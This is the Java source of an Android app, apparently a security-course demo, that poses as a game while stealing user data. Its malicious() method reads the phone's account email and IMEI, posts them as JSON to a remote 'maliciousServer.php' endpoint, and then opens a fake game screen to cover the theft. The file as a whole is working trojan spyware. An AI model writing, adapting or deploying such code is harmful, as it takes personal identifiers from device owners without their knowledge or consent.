package com.dev.waywardwobbuffet.maliciousroot;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.Patterns;
import android.view.View;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.IOException;
import java.util.regex.Pattern;


public class MainActivity extends Activity {

    private static String activityName = "MainActivity";
    private static String urlString = "http://impcalendar.web.engr.illinois.edu/maliciousServer.php";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void malicious(View v) {
        if(isConnectedToNetwork(getApplicationContext())) {
            //Get data and send
            String email = getEmail(getApplicationContext());
            String imei = getIMEI(getApplicationContext());

            try {
                JSONObject payload = new JSONObject();
                payload.put("email", email);
                payload.put("imei", imei);

                //Launch task
                TransmitPostTask malTask = new TransmitPostTask();
                malTask.execute(payload);
            } catch (JSONException je) {
                Log.d(activityName, "JSON Exception " + je);
            }
        }
        else {
            //No network to do bad things
            launchFakeGame(null);
        }
    }

    private void launchFakeGame(JSONObject response) {
        Intent intent = new Intent(getApplicationContext(), FakeGameActivity.class);
        startActivity(intent);
    }

    protected static boolean isConnectedToNetwork(Context context) {
        ConnectivityManager conMgr = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = conMgr.getActiveNetworkInfo();
        return activeNetwork != null && activeNetwork.getState() == NetworkInfo.State.CONNECTED;
    }

    protected String getIMEI(Context ctx) {
        TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        return tm.getDeviceId();
    }

    protected String getEmail(Context context) {
        Pattern emailPattern = Patterns.EMAIL_ADDRESS;
        Account[] accounts = AccountManager.get(context).getAccounts();
        for(Account account : accounts) {
            if(emailPattern.matcher(account.name).matches()) {
                String email = account.name;
                return email;
            }
        }
        //Default return value
        return "noemail@found.com";
    }

    /**
     * Transmitter Task that will post to the server using JSON
     */
    @SuppressWarnings("deprecation")
    public class TransmitPostTask extends AsyncTask<JSONObject, Void, JSONObject> {

        @Override
        protected JSONObject doInBackground(JSONObject... params) {
            try {
                // Simulate network access.
                HttpParams httpParameters = new BasicHttpParams();
                HttpConnectionParams.setConnectionTimeout(httpParameters, 5000);
                HttpConnectionParams.setSoTimeout(httpParameters, 5000);

                StringEntity entity = new StringEntity(params[0].toString(), HTTP.UTF_8);
                entity.setContentType("application/json");

                HttpClient client = new DefaultHttpClient(httpParameters);
                HttpPost httpPost = new HttpPost(urlString);
                httpPost.setEntity(entity);

                HttpResponse response;
                response = client.execute(httpPost);

                HttpEntity responseEntity = response.getEntity();
                String result = EntityUtils.toString(responseEntity);

                return new JSONObject(result);
            } catch (IOException e) {
                Log.d(activityName, "IO Exception" + e);
                return null;
            } catch (JSONException je) {
                Log.d(activityName, "JSON Exception " + je);
                return null;
            }
        }

        @Override
        protected void onPostExecute(JSONObject responseData) {
            launchFakeGame(responseData);
        }
    }
}
